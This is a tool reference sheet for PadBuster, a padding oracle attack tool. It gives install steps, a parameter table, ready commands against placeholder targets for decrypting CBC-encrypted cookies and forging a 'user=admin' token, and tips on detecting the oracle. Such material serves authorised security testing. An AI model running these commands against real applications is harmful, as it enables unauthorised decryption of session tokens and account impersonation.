# PadBuster

- **Category**: Web / Padding Oracle
- **Risk Level**: 🔴 High

---

## Description

Automates padding oracle attacks against CBC-mode encrypted tokens in web applications. Tests for padding oracle vulnerabilities by manipulating encrypted cookies, parameters, or other tokens — observing differences in server responses to distinguish valid from invalid padding. Can decrypt ciphertext without the key and forge new encrypted values. Written in Perl.

## Installation

```bash
sudo apt install padbuster
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `URL` | Target URL containing the encrypted sample (positional, required) |
| `EncryptedSample` | The encrypted value to test/decrypt (positional, required) |
| `BlockSize` | Cipher block size in bytes — typically `8` (DES/3DES) or `16` (AES) (positional, required) |
| `-cookies <value>` | Cookie string to include with requests |
| `-encoding <0-4>` | Encoding of the encrypted sample: `0` = Base64 (default), `1` = hex (lowercase), `2` = hex (uppercase), `3` = .NET URL token, `4` = WebSafe Base64 |
| `-error <string>` | Padding error string to match in responses (alternative to response-length analysis) |
| `-headers <Name::Val>` | Custom HTTP headers (`Name::Value` format) |
| `-interactive` | Prompt for confirmation at each step |
| `-log` | Log HTTP traffic to file |
| `-noiv` | Sample does not include IV (decrypt first block) |
| `-noencode` | Do not URL-encode the payload in the request |
| `-plaintext <text>` | Plaintext to encrypt using the oracle (forging mode) |
| `-post <data>` | POST body data (switches request method to POST) |
| `-prefix <value>` | Prefix prepended to each encrypted sample |
| `-proxy <url>` | HTTP proxy (e.g., `http://127.0.0.1:8080`) |
| `-verbose` | Show verbose output including HTTP responses |

## Common Commands

```bash
# Detect padding oracle and decrypt a Base64-encoded cookie (AES, block size 16)
padbuster http://target.com/app?token=SampleToken SampleToken 16

# Decrypt a cookie value passed via -cookies
padbuster http://target.com/profile "" 16 \
  -cookies "auth=EncryptedCookieValue" \
  -encoding 0

# Specify a known padding error string for reliable detection
padbuster http://target.com/app?token=SampleToken SampleToken 16 \
  -error "Invalid padding"

# Forge a new encrypted cookie value (encrypt arbitrary plaintext)
padbuster http://target.com/app?token=SampleToken SampleToken 16 \
  -plaintext "user=admin"

# Use hex-encoded sample with POST data through a proxy
padbuster http://target.com/login "" 16 \
  -post "token=HexEncodedValue" \
  -encoding 1 \
  -proxy http://127.0.0.1:8080

# Decrypt only (no IV in sample), with verbose logging
padbuster http://target.com/app?token=SampleToken SampleToken 8 \
  -noiv -verbose -log
```

## Notes & Tips

1. Block size must match the cipher — use `16` for AES (most common in modern apps), `8` for DES/3DES.
2. The `-error` flag greatly improves reliability when the server returns a distinctive error message for padding failures; without it, PadBuster relies on response-length analysis, which is noisier.
3. Padding oracle attacks generate a large number of requests (up to 256 per byte). Use `-proxy` to monitor traffic in Burp Suite and confirm the oracle is working before full runs.
4. When forging values with `-plaintext`, the tool requires a working oracle first — always verify decryption succeeds before attempting encryption.
5. Some applications URL-encode or double-encode the cipher token; use `-encoding` and `-noencode` to match the exact encoding the server expects.

---

## Official References

- [PadBuster GitHub](https://github.com/strozfriedberg/PadBuster)
- [Kali Tools — padbuster](https://www.kali.org/tools/padbuster/)
